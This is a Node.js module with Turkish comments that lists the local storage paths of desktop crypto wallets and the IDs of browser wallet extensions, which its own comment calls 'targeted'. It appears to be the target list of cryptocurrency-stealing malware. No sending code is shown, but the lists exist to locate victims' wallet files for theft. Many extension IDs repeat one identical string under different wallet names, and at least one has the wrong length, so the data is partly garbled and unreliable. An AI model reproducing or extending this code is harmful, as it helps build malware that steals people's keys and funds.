const os = require('os');
const path = require('path');

/**
 * Bilinen kripto cüzdanlarının yerel dosya yollarını döndürür.
 */
const getPaths = () => {
    const home = os.homedir();
    const appData = process.env.APPDATA || path.join(home, 'AppData', 'Roaming');
    const localAppData = process.env.LOCALAPPDATA || path.join(home, 'AppData', 'Local');

    return {
        "Exodus": path.join(appData, "Exodus", "exodus.wallet", "atomic"),
        "Atomic": path.join(appData, "atomic", "Local Storage", "leveldb"),
        "Coinomi": path.join(localAppData, "Coinomi", "Coinomi", "wallets"),
        "Electrum": path.join(appData, "Electrum", "wallets"),
        "MultiDoge": path.join(appData, "MultiDoge"),
        "Armory": path.join(appData, "Armory"),
        "Guarda": path.join(appData, "Guarda", "Local Storage", "leveldb")
    };
};

/**
 * Hedeflenen tarayıcı eklentilerinin (wallet extensions) ID listesini döndürür.
 */
const getExtensions = () => {
    return {
        "Authenticator": "bhghoamapcdpbohnocijkmbdebbimche",
        "Binance": "fhbohgcigdclheihbhajndimohnooabi",
        "Bitkeep": "jiidiaalihhddhlgeachkofmcaonbhgh",
        "BlockWallet": "pmoihdcagmfofdlhkmgofmbbmbhebbhi",
        "Coin98": "aeachkofmcaonbhghbhghoamapcdpboh",
        "Coinbase": "hnfanknocfeofbdgmciedclcbookoccl",
        "Core": "mhoffinnofdbhopmcaonbhghbhghoama",
        "Cyano": "pmoihdcagmfofdlhkmgofmbbmbhebbhi",
        "Dash": "aeachkofmcaonbhghbhghoamapcdpboh",
        "Enkrypt": "pmoihdcagmfofdlhkmgofmbbmbhebbhi",
        "Ever": "pmoihdcagmfofdlhkmgofmbbmbhebbhi",
        "Exodus": "aeachkofmcaonbhghbhghoamapcdpboh",
        "Finn": "pmoihdcagmfofdlhkmgofmbbmbhebbhi",
        "Guarda": "aeachkofmcaonbhghbhghoamapcdpboh",
        "Harmony": "fhbohgcigdclheihbhajndimohnooabi",
        "Huobi": "aeachkofmcaonbhghbhghoamapcdpboh",
        "Iron": "aeachkofmcaonbhghbhghoamapcdpboh",
        "Jaxx": "aeachkofmcaonbhghbhghoamapcdpboh",
        "Kaikas": "fhbohgcigdclheihbhajndimohnooabi",
        "Kardinachain": "aeachkofmcaonbhghbhghoamapcdpboh",
        "Keplr": "dmkamcknoicmgleedhkeciohgdilsjbg",
        "Liquality": "aeachkofmcaonbhghbhghoamapcdpboh",
        "Maiar": "aeachkofmcaonbhghbhghoamapcdpboh",
        "Math": "afbcbhalookocclhnfanknocfeofbdgm",
        "Metamask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
        "Mew": "aeachkofmcaonbhghbhghoamapcdpboh",
        "Nami": "lpcaedmchfhocbbbackclmgeclblekgi",
        "NeoLine": "aeachkofmcaonbhghbhghoamapcdpboh",
        "Oasis": "aeachkofmcaonbhghbhghoamapcdpboh",
        "OKX": "mclkkofmcaonbhghbhghoamapcdpboh",
        "OneKey": "aeachkofmcaonbhghbhghoamapcdpboh",
        "PaliWallet": "aeachkofmcaonbhghbhghoamapcdpboh",
        "Petra": "aeachkofmcaonbhghbhghoamapcdpboh",
        "Phantom": "bfnaoomephoeidhlnoafignebonpccnb",
        "Pontem": "aeachkofmcaonbhghbhghoamapcdpboh",
        "Ronin": "fnjhmkhhmkbjkkabndcnnogagogbneec",
        "Slope": "aeachkofmcaonbhghbhghoamapcdpboh",
        "Solflare": "fhbohgcigdclheihbhajndimohnooabi",
        "Sui": "aeachkofmcaonbhghbhghoamapcdpboh",
        "Temple": "aeachkofmcaonbhghbhghoamapcdpboh",
        "TerraStation": "aiifhnccbhgepcnbhghbhghoamapcdpb",
        "TokenPocket": "aeachkofmcaonbhghbhghoamapcdpboh",
        "Trust": "egjidjbpgpccnoebpabnneodehlehhno",
        "Tron": "ibnejdfjmmkpcnlebbpgnndnlneibihe",
        "Venom": "aeachkofmcaonbhghbhghoamapcdpboh",
        "Wombat": "aeachkofmcaonbhghbhghoamapcdpboh",
        "XDeFi": "aeachkofmcaonbhghbhghoamapcdpboh",
        "Yoroi": "aeachkofmcaonbhghbhghoamapcdpboh"
    };
};

module.exports = { getPaths, getExtensions };
